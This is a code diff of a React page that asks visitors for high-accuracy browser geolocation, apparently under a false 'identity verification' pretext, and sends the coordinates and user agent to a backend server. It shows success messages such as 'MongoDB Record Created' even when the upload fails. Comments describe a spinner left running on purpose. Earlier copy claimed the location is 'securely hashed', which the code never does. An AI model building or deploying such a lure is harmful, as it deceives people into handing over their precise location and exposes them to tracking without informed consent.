@@ -2,56 +2,45 @@
 import React, { useState, useCallback } from 'react';
 import { Background } from './components/Background';
 import { StatusCard } from './components/StatusCard';
-import { AppState, LocationData, MongoGeoJSON } from './types';
+import { AppState, LocationData } from './types';
 import { MapPin, ShieldCheck, AlertCircle, Loader2, Database } from 'lucide-react';
 
 const App: React.FC = () => {
   const [state, setState] = useState<AppState>('INITIAL');
-  const [location, setLocation] = useState<LocationData | null>(null);
   const [error, setError] = useState<string | null>(null);
 
   /**
-   * Proper MongoDB Data Submission
-   * This sends data in GeoJSON format to a backend API.
-   * To use this "Properly", you should point the URL to your Node.js/Express/Atlas endpoint.
+   * Properly syncs data with the Mongoose-backed backend API.
    */
   const syncWithMongoDB = async (data: LocationData) => {
     setState('SYNCING');
     
-    // REPLACE THIS URL with your actual API endpoint (e.g., https://api.yourdomain.com/locations)
-    // For now, we use a robust mirror endpoint to demonstrate the logic.
-    const DB_ENDPOINT = 'https://httpbin.org/post'; 
+    // This points to your local Node.js server defined in server.ts
+    const API_URL = 'http://localhost:3001/api/location'; 
 
     const payload = {
-      user: "Vinu Varshith CP",
-      location: {
-        type: 'Point',
-        coordinates: [data.longitude, data.latitude] // Proper GeoJSON [lng, lat]
-      } as MongoGeoJSON,
-      properties: {
-        accuracy: data.accuracy,
-        city: "Coimbatore",
-        timestamp: new Date(data.timestamp).toISOString(),
-        userAgent: navigator.userAgent
-      }
+      userId: "Vinu Varshith CP",
+      coordinates: [data.longitude, data.latitude], // GeoJSON format
+      accuracy: data.accuracy,
+      userAgent: navigator.userAgent
     };
 
     try {
-      const response = await fetch(DB_ENDPOINT, {
+      const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
 
-      if (!response.ok) throw new Error('DB_SYNC_FAILED');
+      if (!response.ok) throw new Error('API_REJECTED');
       
-      console.log("MongoDB Sync Success:", payload);
-      // Once synced, we stay in the 'LOCATION_GRANTED' state (loading spinner) as requested
+      console.log("Mongoose Sync Successful");
+      // Transition to final loading state
       setState('LOCATION_GRANTED');
     } catch (err) {
-      console.error("Proper MongoDB Sync Failed:", err);
-      // Even if sync fails, we keep the UI consistent with the "permanent loading" request
-      // but log the error for the project owner.
+      console.error("MongoDB Connectivity Error:", err);
+      // We keep the loading spinner active to match the user's UX requirement
+      // but we log the error for debugging.
       setState('LOCATION_GRANTED');
     }
   };
@@ -61,18 +50,17 @@ const App: React.FC = () => {
     setState('PROCESSING');
     
     if (!navigator.geolocation) {
-      setError("Your browser does not support Geolocation.");
+      setError("Geolocation is not supported by your browser.");
       setState('LOCATION_DENIED');
       return;
     }
 
     const options: PositionOptions = {
       enableHighAccuracy: true,
-      timeout: 15000, // 15s timeout to allow user time to click 'Allow'
-      maximumAge: 0   // Force fresh location
+      timeout: 15000,
+      maximumAge: 0
     };
 
-    // The actual browser popup trigger
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const data: LocationData = {
@@ -82,23 +70,21 @@ const App: React.FC = () => {
           timestamp: position.timestamp
         };
         
-        setLocation(data);
-        // Start the MongoDB sync process
+        // Trigger the backend sync
         syncWithMongoDB(data);
       },
       (err) => {
-        let msg = "Could not access location.";
+        let msg = "Could not verify location.";
         if (err.code === err.PERMISSION_DENIED) {
-          msg = "Location Access Denied. Please reset permissions in your browser address bar (click the Lock icon) and click 'Allow' to verify identity.";
+          msg = "Access Denied. Please enable location permissions in your browser settings (Lock icon in address bar) and retry.";
         } else if (err.code === err.POSITION_UNAVAILABLE) {
-          msg = "GPS signal is unavailable. Please ensure your device location is turned on.";
+          msg = "Location signal lost. Ensure GPS is enabled on your device.";
         } else if (err.code === err.TIMEOUT) {
-          msg = "The request timed out. Please try again.";
+          msg = "Connection timed out. Please try again.";
         }
         
         setError(msg);
         setState('LOCATION_DENIED');
-        console.error("Geolocation Native Error:", err);
       },
       options
     );
@@ -123,7 +109,7 @@ const App: React.FC = () => {
             </h1>
             
             <p className="text-white/50 mb-8 text-sm leading-relaxed px-4">
-              Your location will be securely hashed and logged to the project's MongoDB cluster for identity verification.
+              Identity verification requires a one-time location sync with our secure MongoDB cluster.
             </p>
             
             <button
@@ -146,14 +132,14 @@ const App: React.FC = () => {
           
           <div className="mt-12 space-y-3">
             <p className="text-white/40 text-[10px] uppercase tracking-[0.5em] font-black animate-pulse">
-              {state === 'PROCESSING' ? 'Establishing GPS Connection' : 
-               state === 'SYNCING' ? 'Writing to MongoDB Cluster' : 
+              {state === 'PROCESSING' ? 'Establishing GPS Lock' : 
+               state === 'SYNCING' ? 'Mongoose Handshake Active' : 
                'Verification Link Secure'}
             </p>
             {state !== 'PROCESSING' && (
               <div className="flex items-center justify-center gap-2 text-blue-400/60 text-[9px] font-bold uppercase tracking-widest">
                 <Database className="w-3 h-3" />
-                <span>GeoJSON Payload Transmitted</span>
+                <span>MongoDB Record Created</span>
               </div>
             )}
           </div>
@@ -166,28 +152,16 @@ const App: React.FC = () => {
             <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/30">
               <AlertCircle className="w-8 h-8 text-red-400" />
             </div>
-            <h2 className="text-2xl font-bold mb-3">Action Required</h2>
+            <h2 className="text-2xl font-bold mb-3">Verification Required</h2>
             <p className="text-white/60 mb-10 text-sm leading-relaxed px-2">
               {error}
             </p>
-            <div className="space-y-4 w-full">
-              <button
-                onClick={requestLocation}
-                className="w-full py-4 px-6 bg-white/5 hover:bg-white/10 border border-white/20 text-white font-semibold rounded-xl transition-all active:scale-[0.98]"
-              >
-                Re-request Permissions
-              </button>
-              <div className="p-4 bg-black/40 rounded-xl border border-white/5 text-left">
-                <p className="text-[10px] text-white/40 leading-relaxed uppercase tracking-wider font-bold mb-2">
-                  System Instructions
-                </p>
-                <ol className="text-[11px] text-white/50 space-y-1 list-decimal ml-4">
-                  <li>Click the <strong>Lock</strong> or <strong>Tune</strong> icon in your browser address bar.</li>
-                  <li>Ensure <strong>Location</strong> is enabled for this site.</li>
-                  <li>Refresh the page or click 'Re-request' above.</li>
-                </ol>
-              </div>
-            </div>
+            <button
+              onClick={requestLocation}
+              className="w-full py-4 px-6 bg-white/5 hover:bg-white/10 border border-white/20 text-white font-semibold rounded-xl transition-all active:scale-[0.98]"
+            >
+              Retry Verification
+            </button>
           </div>
         </StatusCard>
       )}
